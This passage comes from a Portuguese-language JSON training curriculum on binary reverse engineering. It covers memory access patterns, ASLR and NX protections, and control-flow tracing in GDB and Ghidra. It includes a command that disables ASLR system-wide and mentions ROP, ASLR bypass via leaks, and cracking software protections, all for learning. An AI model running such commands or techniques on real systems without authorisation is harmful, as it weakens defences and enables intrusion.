                                    "GDB + gef/peda",
                                    "Binário C com malloc/free",
                                    "Doc glibc ptmalloc"
                                  ],
                                  "tips": "Heap pointers são dinâmicos; trace de onde vêm (syscall ou função).",
                                  "learningObjective": "Diferenciar acessos heap de stack e identificar padrões de alocação.",
                                  "commonMistakes": [
                                    "Confundir heap com stack.",
                                    "Ignorar metadata heap (size/prev_size).",
                                    "Não detectar double-free via acessos."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Considerar proteções de memória: ASLR e NX bit",
                                  "subSteps": [
                                    "Explicar ASLR: randomização de base addresses (stack, heap, libs).",
                                    "Explicar NX/DEP: marca páginas como non-executable (W^X).",
                                    "Desabilitar ASLR temporariamente: setarch -R ou echo 0 > /proc/sys/kernel/randomize_va_space.",
                                    "Analisar impacto: leaks para bypass ASLR, ROP para NX.",
                                    "Verificar em GDB: 'info proc mappings' para ASLR, 'checksec' para NX."
                                  ],
                                  "verification": "Explicar como ASLR/NX afetam um exploit buffer overflow em um binário.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Binário vulnerável (ex: de ROP Emporium)",
                                    "checksec.sh",
                                    "GDB"
                                  ],
                                  "tips": "Sempre cheque headers ELF para proteções antes da análise.",
                                  "learningObjective": "Avaliar como mitigações alteram acessos e explorações de memória.",
                                  "commonMistakes": [
                                    "Assumir endereços fixos sem checar ASLR.",
                                    "Ignorar NX em ROP chains.",
                                    "Não recompilar com proteções off para prática."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário vulnerável a buffer overflow (ex: ROP Emporium 'ret2win'), use GDB para examinar MOV [EBP-0x20], EAX (escrita stack local), PUSH gadgets na stack, acessos heap via malloc pointer, e note como ASLR randomiza $rsp, exigindo leak para pivot.",
                              "finalVerifications": [
                                "Identificar corretamente [reg + offset] em 90% de um código assembly aleatório.",
                                "Rastrear stack pointer após sequência PUSH/POP em GDB.",
                                "Diferenciar acessos stack vs heap em uma função com malloc.",
                                "Explicar bypass básico de ASLR via info leak.",
                                "Descrever impacto NX em shellcode injection.",
                                "Mapear proteções em 'checksec' de um binário."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de tipos de acesso (offset/stack/heap): 30%.",
                                "Compreensão de registradores e offsets: 25%.",
                                "Análise prática via GDB: 20%.",
                                "Integração de proteções (ASLR/NX): 15%.",
                                "Explicações claras e exemplos acionáveis: 10%."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Modelo de memória segmentada/paginada.",
                                "Sistemas Operacionais: Gerenciadores de memória (mmap, brk).",
                                "Segurança da Informação: Mitigações de exploits (PIE, Canary).",
                                "Programação em C: Ponteiros, alocação dinâmica e undefined behavior.",
                                "Engenharia Reversa: Disassembly e debugging dinâmico."
                              ],
                              "realWorldApplication": "Na análise de malware ou pentesting, examinar acessos memória em binários para detectar shellcode injection, buffer overflows ou heap spraying, permitindo desenvolvimento de detecções IDS/IPS ou exploits éticos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.3.3",
                            "name": "Rastrear fluxo de controle via jumps e calls",
                            "description": "Analisar instruções condicionais (JE, JNE, etc.) e incondicionais para mapear caminhos de execução e pontos de controle de fluxo em binários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar instruções de controle de fluxo no código assembly",
                                  "subSteps": [
                                    "Abra o binário no disassembler (ex: Ghidra ou IDA Free).",
                                    "Navegue pelo código e procure instruções como JMP, JE, JNE, JZ, JNZ, CALL, RET.",
                                    "Marque todas as ocorrências com highlights ou anotações.",
                                    "Registre endereços de origem e possíveis alvos.",
                                    "Ignore instruções não relacionadas ao fluxo (ex: MOV, ADD)."
                                  ],
                                  "verification": "Lista completa de instruções de CF com endereços anotados no disassembler.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta de disassemblagem (Ghidra, Radare2 ou objdump)",
                                    "Binário de exemplo em 32/64 bits"
                                  ],
                                  "tips": "Use função de busca por padrões de opcodes (ex: 'jmp*', 'j*') para agilizar.",
                                  "learningObjective": "Reconhecer e localizar todas as instruções que alteram o IP (Instruction Pointer).",
                                  "commonMistakes": "Esquecer CALL/RET ou confundir jumps com chamadas de API."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Classificar instruções condicionais e analisar flags",
                                  "subSteps": [
                                    "Para cada JE/JNE/JZ/etc., identifique a flag envolvida (ZF para JE/JNE, CF para JB/JAE).",
                                    "Verifique instruções anteriores que setam flags (CMP, TEST, ADD/SUB).",
                                    "Anote condições booleanas: ex: JE = ZF==1.",
                                    "Classifique como loop (forward/backward jump) ou branch if/else.",
                                    "Documente em tabela: Instrução | Flag | Condição | Alvo."
                                  ],
                                  "verification": "Tabela de classificação com condições lógicas corretas para cada jump condicional.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Disassembler com view de flags",
                                    "Referência de manual Intel x86 (PDF ou online)"
                                  ],
                                  "tips": "Ative visualização de flags no Ghidra para ver set/reset dinamicamente.",
                                  "learningObjective": "Entender como flags determinam caminhos condicionais no assembly.",
                                  "commonMistakes": "Confundir flags (ex: ZF com CF) ou ignorar instruções que clearam flags."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear jumps incondicionais, calls e construir grafo inicial",
                                  "subSteps": [
                                    "Para JMP incondicional, trace diretamente para o alvo.",
                                    "Para CALL, note endereço de retorno (próxima instrução) e função alvo.",
                                    "Crie nós (endereços) e arestas (jumps/calls) em diagrama simples (papel ou ferramenta).",
                                    "Identifique entradas/saídas de funções via RET.",
                                    "Conecte todos os fluxos lineares interrompidos."
                                  ],
                                  "verification": "Diagrama de grafo com nós e arestas rotuladas (condicional/incondicional).",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta de grafo (draw.io, Ghidra Graph view)",
                                    "Papel e caneta para rascunho"
                                  ],
                                  "tips": "Use cores: azul para condicional, verde para incondicional, vermelho para CALL.",
                                  "learningObjective": "Representar controle de fluxo como grafo dirigido.",
                                  "commonMistakes": "Perder retornos de CALL ou jumps para fora da função atual."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular e validar caminhos de execução completos",
                                  "subSteps": [
                                    "Escolha inputs iniciais e simule flags passo a passo.",
                                    "Trace todos os caminhos possíveis (ex: 2^n para n branches).",
                                    "Identifique loops e pontos de decisão críticos.",
                                    "Verifique consistência: sem caminhos mortos ou infinitos não intencionais.",
                                    "Atualize grafo com probabilidades ou cenários reais."
                                  ],
                                  "verification": "Relatório de caminhos simulados cobrindo todos os branches, sem inconsistências.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Debugger (GDB, x64dbg)",
                                    "Simulador de assembly online"
                                  ],
                                  "tips": "Limite simulação a 4-5 caminhos principais para evitar explosão combinatória.",
                                  "learningObjective": "Prever comportamento dinâmico do binário baseado em fluxos estáticos.",
                                  "commonMistakes": "Não considerar dependências de dados em flags ou overflows em loops."
                                }
                              ],
                              "practicalExample": "Em um binário x86-32: \n0x401000: cmp eax, ebx\n0x401002: je 0x401010  ; ZF=1 -> autenticação OK\n0x401004: jmp 0x401020  ; falha\n0x401010: call 0x401100  ; func segura\n0x401015: ret\nRastreamento: Caminho1 (ZF=1): 1000->1002->1010->call->1015->ret. Caminho2: 1000->1002->1004->1020.",
                              "finalVerifications": [
                                "Todas instruções de jump/call mapeadas sem omissões.",
                                "Condições de flags corretamente associadas a branches.",
                                "Grafo de fluxo cobre 100% dos caminhos possíveis.",
                                "Simulações confirmam ausência de caminhos mortos.",
                                "Pontos de controle (loops, guards) identificados.",
                                "Diagrama legível e anotado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de instruções CF (90%+).",
                                "Correta classificação de condicionais/incondicionais.",
                                "Grafo completo e sem erros de conexão.",
                                "Simulações realistas com exemplos de inputs.",
                                "Análise de complexidade de fluxo (ex: número de caminhos).",
                                "Clareza na documentação e visualizações."
                              ],
                              "crossCurricularConnections": [
                                "Teoria dos Grafos: Nós (blocos básicos), arestas direcionadas.",
                                "Lógica Booleana: Avaliação de flags como expressões lógicas.",
                                "Programação Estruturada: Tradução de if/while para jumps.",
                                "Análise de Algoritmos: Complexidade de caminhos de controle.",
                                "Segurança de Software: Detecção de bypass de controles via fluxo."
                              ],
                              "realWorldApplication": "Na análise de malware para mapear lógica de evasão (ex: anti-debugging via jumps condicionais); em engenharia reversa para crackear proteções de software; debugging de falhas em binários legados onde source code está perdido."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              }
            ],
            "totalSkills": 289
          }
        ],
        "totalSkills": 289
      }
    ]
  }
}